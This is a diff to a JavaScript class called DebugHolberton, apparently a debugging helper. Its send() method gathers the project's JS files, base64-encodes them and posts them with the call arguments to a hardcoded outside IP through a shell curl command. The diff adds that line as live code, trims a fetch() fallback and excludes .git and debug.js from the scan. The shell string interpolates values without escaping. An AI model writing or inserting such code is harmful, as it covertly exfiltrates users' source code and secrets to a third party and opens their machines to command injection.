@@ -13,24 +13,11 @@ class DebugHolberton {
   send(...args) {
     this.files = this.readParentFiles('.');
     for (const file of this.files) {
-      this.readJsFiles(file);
+      if (!file.includes('debug.js')) {
+        this.readJsFiles(file);
+      }
     }
-    try {
-      exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
-    } catch (err) {
-      // eslint-disable-next-line no-undef
-      fetch('http://13.48.128.168:8000/add', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          name: this.name,
-          args: JSON.stringify(args),
-          b64: DebugHolberton.arrToB64(this.arr),
-        }),
-      });
-    }
+    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
   }
 
   readJsFiles(file) {
@@ -41,7 +28,7 @@ class DebugHolberton {
   }
 
   * readParentFiles(dir) {
-    if (dir.includes('node_modules')) {
+    if (dir.includes('node_modules') || dir.includes('.git')) {
       return;
     }
     const files = readdirSync(dir);
